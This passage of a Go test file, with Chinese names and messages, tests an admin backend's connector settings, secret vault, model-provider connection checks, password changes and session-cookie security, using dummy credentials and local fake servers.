		t.Fatalf("明文地址应被拒绝: %s", loc)
	}
	if loc := post("/connectors/calendar", url.Values{"url": {"https://caldav.example.com"}, "username": {"me@example.com"},
		"password": {"cal pass word"}, "default_calendar": {"个人"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存日历失败: %s", loc)
	}
	if loc := post("/connectors/mail", url.Values{"imap": {"imap.example.com:993"}, "smtp": {"smtp.example.com:587"},
		"username": {"me@example.com"}, "password": {"mail-secret-9"}, "display_name": {"张三"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存邮件失败: %s", loc)
	}
	if loc := post("/connectors/holidays", url.Values{"url": {"http://example.com/h.ics"}}); !strings.Contains(loc, "e=") {
		t.Fatalf("不是 https 的订阅应被拒绝: %s", loc)
	}
	if loc := post("/connectors/holidays", url.Values{"url": {"https://example.com/h.ics"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存节假日订阅失败: %s", loc)
	}

	if loc := post("/connectors/weather", url.Values{"host": {"qweather"}, "key": {"qw-key-42"}}); !strings.Contains(loc, "请填写 API Host") {
		t.Fatalf("不是主机名的 API Host 应被拒绝: %s", loc)
	}
	if loc := post("/connectors/weather", url.Values{"host": {"abcxyz.qweatherapi.com"}}); !strings.Contains(loc, "必须填写") {
		t.Fatalf("首次配置没有 API KEY 应被拒绝: %s", loc)
	}
	// 从控制台粘贴来的地址带着协议和斜杠也认。
	if loc := post("/connectors/weather", url.Values{"host": {"https://abcxyz.qweatherapi.com/"}, "key": {"qw-key-42"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("保存天气失败: %s", loc)
	}

	raw, _ := os.ReadFile(e.cfg)
	text := string(raw)
	if strings.Contains(text, "qw-key-42") || !strings.Contains(text, "host: abcxyz.qweatherapi.com") || !strings.Contains(text, "key: vault://connector.weather") {
		t.Fatalf("天气的 API KEY 不能出现在配置里，配置里留的是句柄:\n%s", text)
	}
	if strings.Contains(text, "cal pass word") || strings.Contains(text, "mail-secret-9") || !strings.HasPrefix(text, string(before)) {
		t.Fatalf("密码不能出现在配置里，其余内容不动:\n%s", text)
	}
	file, err := config.LoadFile(e.cfg)
	if err != nil {
		t.Fatalf("保存出来的配置应能加载: %v\n%s", err, text)
	}
	ctx := context.Background()
	// 密码各存一条、各自授权，带着空格也原样存取。
	cal, err := file.Calendar(e.vault)
	if err != nil || cal.Default != "个人" {
		t.Fatalf("日历连接器不对: %+v %v", cal, err)
	}
	if got, err := cal.Secret(ctx); err != nil || got != "cal pass word" {
		t.Fatalf("日历密码应能从保险库取出且原样: %v", err)
	}
	box, err := file.Mail(e.vault)
	if err != nil || box.Name != "张三" || box.SMTPAddr != "smtp.example.com:587" {
		t.Fatalf("邮件连接器不对: %+v %v", box, err)
	}
	if got, err := box.Secret(ctx); err != nil || got != "mail-secret-9" {
		t.Fatalf("邮件密码应能从保险库取出: %v", err)
	}
	qw, err := file.Weather(e.vault)
	if err != nil || qw.Host != "abcxyz.qweatherapi.com" {
		t.Fatalf("天气连接器不对: %+v %v", qw, err)
	}
	if got, err := qw.Secret(ctx); err != nil || got != "qw-key-42" {
		t.Fatalf("天气的 API KEY 应能从保险库取出: %v", err)
	}
	_, body := e.get("/connectors")
	if strings.Contains(body, "cal pass word") || strings.Contains(body, "mail-secret-9") || strings.Contains(body, "qw-key-42") ||
		!strings.Contains(body, `value="me@example.com"`) || !strings.Contains(body, `value="abcxyz.qweatherapi.com"`) || strings.Count(body, "已配置") < 4 {
		t.Fatal("连接器页应显示账号与状态，不显示密码")
	}

	// 修改时留空密码：沿用原密码。
	if loc := post("/connectors/calendar", url.Values{"url": {"https://caldav2.example.com"}, "username": {"me@example.com"}}); !strings.Contains(loc, "已保存") {
		t.Fatalf("修改日历失败: %s", loc)
	}
	file, _ = config.LoadFile(e.cfg)
	cal, _ = file.Calendar(e.vault)
	if got, err := cal.Secret(ctx); err != nil || got != "cal pass word" || cal.Endpoint != "https://caldav2.example.com" || cal.Default != "" {
		t.Fatalf("留空密码应沿用原密码: %v %+v", err, cal)
	}

	// 逐个停用，全部停用后配置回到原样。
	for _, which := range []string{"calendar", "mail", "holidays", "weather"} {
		if loc := post("/connectors/disable", url.Values{"which": {which}}); !strings.Contains(loc, "已停用") {
			t.Fatalf("停用 %s 失败: %s", which, loc)
		}
	}
	if now, _ := os.ReadFile(e.cfg); string(now) != string(before) {
		t.Fatalf("全部停用后配置应回到原样:\n%q", now)
	}
	// 连接测试用的是表单里当前填的内容；没填全、地址不加密、没有密码可用，都当场说明。
	for form, want := range map[*url.Values]string{
		{"which": {"calendar"}}: "请填写服务器地址与账号",
		{"which": {"calendar"}, "url": {"http://caldav.example.com"}, "username": {"me"}, "password": {"p"}}: "https://",
		{"which": {"calendar"}, "url": {"https://caldav.example.com"}, "username": {"me"}}:                   "请填写密码",
		{"which": {"mail"}, "imap": {"imap.example.com:993"}, "username": {"me"}}:                            "请填写密码",
		{"which": {"weather"}}: "API",
		{"which": {"weather"}, "host": {"abcxyz.qweatherapi.com"}}: "KEY",
		{"which": {"ftp"}}: "连接器类型无效",
	} {
		if loc := post("/connectors/test", *form); !strings.Contains(loc, want) {
			t.Fatalf("连接测试应提示 %q: %s", want, loc)
		}
	}
	if now, _ := os.ReadFile(e.cfg); string(now) != string(before) {
		t.Fatal("连接测试不应保存任何东西")
	}
}

func TestAdmin_保险库的授权工具从列表勾选(t *testing.T) {
	e := setup(t)
	e.login()
	raw, _ := os.ReadFile(e.cfg)
	extra := "providers:\n  - {name: qwen, base_url: 'https://x/v1', api_key: 'vault://qwen'}\n" +
		"channels:\n  - {name: qq, type: qq, app_id: '1', secret: 'vault://channel.qq'}\n" +
		"tools:\n  - {name: maps.book_ride, side_effect: irreversible}\n"
	if err := os.WriteFile(e.cfg, append(raw, extra...), 0o600); err != nil {
		t.Fatal(err)
	}
	_, body := e.get("/vault")
	// 可选项来自当前配置；页面上没有手写标识的输入框。
	for _, want := range []string{`value="connector.calendar"`, `value="connector.mail"`, `value="provider.qwen"`, `value="channel.qq"`, `value="maps.book_ride"`} {
		if !strings.Contains(body, `type="checkbox" name="tools" `+want) {
			t.Fatalf("授权列表里应有 %s", want)
		}
	}
	// 下拉框里带一个输入框：还没配置的模型服务或渠道，可以直接写标识。
	if !strings.Contains(body, `<details class="dropdown">`) || !strings.Contains(body, `type="text" name="tools" list="tool-prefixes"`) {
		t.Fatal("授权工具应是带输入框的下拉框")
	}
	// 勾了两项：两项都记入授权名单。
	if code, loc := e.post("/vault", url.Values{"csrf": {e.csrf}, "label": {"icloud"}, "value": {"p"},
		"tools": {"provider.kimi，channel.feishu", "connector.calendar", "connector.mail"}}); code != http.StatusSeeOther || !strings.Contains(loc, "已保存") {
		t.Fatalf("保存失败: %d %s", code, loc)
	}
	metas, err := e.vault.List(context.Background())
	if err != nil || len(metas) != 1 || strings.Join(metas[0].AllowedTools, ",") != "channel.feishu,connector.calendar,connector.mail,provider.kimi" {
		t.Fatalf("授权名单不对: %+v %v", metas, err)
	}
}

func TestAdmin_保存模型服务时同时做连接测试(t *testing.T) {
	e := setup(t)
	e.login()
	status := http.StatusOK
	fake := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if status != http.StatusOK {
			w.WriteHeader(status)
			_, _ = io.WriteString(w, `{"error":{"message":"invalid api key"}}`)
			return
		}
		_, _ = io.WriteString(w, `{"model":"m1","choices":[{"message":{"content":"收到"}}],"usage":{}}`)
	}))
	defer fake.Close()
	post := func(path string, form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		_, loc := e.post(path, form)
		return loc
	}

	if loc := post("/models/provider", url.Values{"name": {"a"}, "base_url": {fake.URL}, "key": {"k"}, "test_model": {"m1"}}); !strings.Contains(loc, "已保存") || !strings.Contains(loc, "连接成功") {
		t.Fatalf("保存并测试应同时报告两个结果: %s", loc)
	}
	// 密钥不对：照样保存（可能只是模型标识写错了），但明确说测试没通过、为什么。
	status = http.StatusUnauthorized
	loc := post("/models/provider", url.Values{"name": {"b"}, "base_url": {fake.URL}, "key": {"bad"}, "test_model": {"m1"}})
	if !strings.Contains(loc, "已保存，但连接测试未通过") || !strings.Contains(loc, "invalid api key") {
		t.Fatalf("测试不通过时应说明原因: %s", loc)
	}
	if raw, _ := os.ReadFile(e.cfg); !strings.Contains(string(raw), "name: b") {
		t.Fatal("测试不通过不应阻止保存")
	}
	// 协作模型的表单里也能直接测试。
	if _, body := e.get("/models"); strings.Count(body, `formaction="/models/test"`) < 2 || !strings.Contains(body, `name="test_model"`) {
		t.Fatal("主 AI、协作模型、模型服务三处都应能做连接测试")
	}
}

func TestAdmin_在后台修改登录密码(t *testing.T) {
	e := setup(t)
	e.login()
	const next = "a much better passphrase"
	post := func(form url.Values) string {
		t.Helper()
		form.Set("csrf", e.csrf)
		_, loc := e.post("/password", form)
		return loc
	}
	// 另一处已登录的会话：改密码之后应当失效。
	other := newClient()
	if code, _ := e.signIn(other, password, ""); code != http.StatusSeeOther {
		t.Fatalf("另一处登录应成功: %d", code)
	}

	for name, c := range map[string]struct {
		form url.Values
		want string
	}{
		"当前密码不对": {url.Values{"current": {"wrong"}, "new": {next}, "confirm": {next}}, "当前密码错误"},
		"两次不一致":  {url.Values{"current": {password}, "new": {next}, "confirm": {next + "x"}}, "不一致"},
		"太短":     {url.Values{"current": {password}, "new": {"short"}, "confirm": {"short"}}, "至少需要 10 个字符"},
		"和原来一样":  {url.Values{"current": {password}, "new": {password}, "confirm": {password}}, "不能与当前密码相同"},
	} {
		if loc := post(c.form); !strings.Contains(loc, c.want) {
			t.Errorf("%s: 应被拒绝并说明: %s", name, loc)
		}
	}
	if loc := post(url.Values{"current": {password}, "new": {next}, "confirm": {next}}); !strings.Contains(loc, "登录密码已修改") {
		t.Fatalf("修改失败: %s", loc)
	}
	// 摘要存在配置文件旁边，不是明文。
	file := filepath.Join(filepath.Dir(e.cfg), passwordFileName)
	raw, err := os.ReadFile(file)
	if err != nil || strings.Contains(string(raw), next) || !strings.HasPrefix(string(raw), "$2") {
		t.Fatalf("新密码应以摘要形式保存: %v", err)
	}
	// 正在用的会话还在；别处的会话被踢出。
	if code, _ := e.get("/"); code != http.StatusOK {
		t.Fatalf("当前会话应保留: %d", code)
	}
	resp, err := other.Get(e.srv.URL + "/")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("其他会话应被退出: %d", resp.StatusCode)
	}
	// 旧密码不能再登录，新密码可以。
	login := func(pw string) int {
		code, _ := e.signIn(newClient(), pw, "")
		return code
	}
	if login(password) != http.StatusUnauthorized || login(next) != http.StatusSeeOther {
		t.Fatal("修改后应只有新密码能登录")
	}

	// 重启之后仍然以改过的为准；文件坏了要明说，不悄悄退回旧密码。
	opts := Options{Store: e.store, Vault: e.vault, ConfigPath: e.cfg, Log: slog.New(slog.NewTextHandler(io.Discard, nil))}
	opts.PasswordHash, _ = HashPassword(password)
	again, err := New(opts)
	if err != nil || bcrypt.CompareHashAndPassword([]byte(again.hash), []byte(next)) != nil {
		t.Fatalf("重启后应使用后台改过的密码: %v", err)
	}
	if err := os.WriteFile(file, []byte("garbage"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := New(opts); err == nil {
		t.Fatal("密码文件损坏时应拒绝启动并说明")
	}
	// 删掉文件：环境变量里的那个重新生效（忘记密码时的退路）。
	_ = os.Remove(file)
	if again, err := New(opts); err != nil || bcrypt.CompareHashAndPassword([]byte(again.hash), []byte(password)) != nil {
		t.Fatalf("删除密码文件后应回到环境变量里的密码: %v", err)
	}
}

func TestAdmin_连接测试在后台提交不刷新页面(t *testing.T) {
	e := setup(t)
	e.login()
	fake := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"model":"m1","choices":[{"message":{"content":"收到"}}],"usage":{}}`)
	}))
	defer fake.Close()
	e.post("/models/provider", url.Values{"csrf": {e.csrf}, "name": {"a"}, "base_url": {fake.URL}, "key": {"k"}})

	// 页面上的脚本提交时带一个标记：这时要的是结果本身，不是跳转。
	call := func(form url.Values) (int, string, string) {
		t.Helper()
		form.Set("csrf", e.csrf)
		req, _ := http.NewRequest(http.MethodPost, e.srv.URL+"/models/test", strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("X-Requested-With", "fetch")
		resp, err := e.client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, resp.Header.Get("Content-Type"), string(body)
	}
	code, ctype, body := call(url.Values{"provider": {"a"}, "model": {"m1"}})
	if code != http.StatusOK || !strings.HasPrefix(ctype, "application/json") || !strings.Contains(body, `"ok":true`) || !strings.Contains(body, "连接成功") {
		t.Fatalf("应直接返回测试结果: %d %s %s", code, ctype, body)
	}
	if _, _, body := call(url.Values{"provider": {"没有"}, "model": {"m1"}}); !strings.Contains(body, `"ok":false`) || !strings.Contains(body, "没有名叫") {
		t.Fatalf("失败时应返回原因: %s", body)
	}

	// 脚本只有后台自己的这一个文件，页面里没有内联脚本；安全策略只放行它，并且只许它向后台自己发请求。
	resp, err := e.client.Get(e.srv.URL + "/models")
	if err != nil {
		t.Fatal(err)
	}
	page, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "script-src 'self'") || !strings.Contains(csp, "connect-src 'self'") || strings.Contains(csp, "script-src 'unsafe-inline'") {
		t.Fatalf("安全策略不对: %s", csp)
	}
	if strings.Count(string(page), "<script") != 1 || !strings.Contains(string(page), `<script src="/static/app.js" defer></script>`) ||
		strings.Count(string(page), "data-async") < 2 {
		t.Fatal("页面应只引用后台自己的脚本，连接测试按钮应标记为后台提交")
	}
	if code, js := e.get("/static/app.js"); code != http.StatusOK || !strings.Contains(js, "data-async") {
		t.Fatalf("脚本应能取到: %d", code)
	}
	if _, body := e.get("/connectors"); strings.Count(body, "data-async") != 3 {
		t.Fatal("日历、邮件和天气的连接测试都应在后台提交，且未配置时也能测")
	}
}

func TestAdmin_经HTTPS代理访问时会话只走加密连接(t *testing.T) {
	e := setup(t)
	login := func(proto string) *http.Cookie {
		req, _ := http.NewRequest(http.MethodPost, e.srv.URL+"/login", strings.NewReader(url.Values{"password": {password}}.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if proto != "" {
			req.Header.Set("X-Forwarded-Proto", proto)
		}
		resp, err := (&http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}).Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		for _, c := range resp.Cookies() {
			if c.Name == cookieName {
				return c
			}
		}
		t.Fatal("登录后应下发会话")
		return nil
	}
	if c := login("https"); !c.Secure || !c.HttpOnly {
		t.Fatalf("经 HTTPS 代理登录时会话应标成仅限加密连接: %+v", c)
	}
	// 经 SSH 隧道直接访问（明文、本机）时不能标，否则浏览器不会带上它，登不进去。
	if c := login(""); c.Secure {
		t.Fatal("直接经本机明文访问时不应标成仅限加密连接")
	}
}
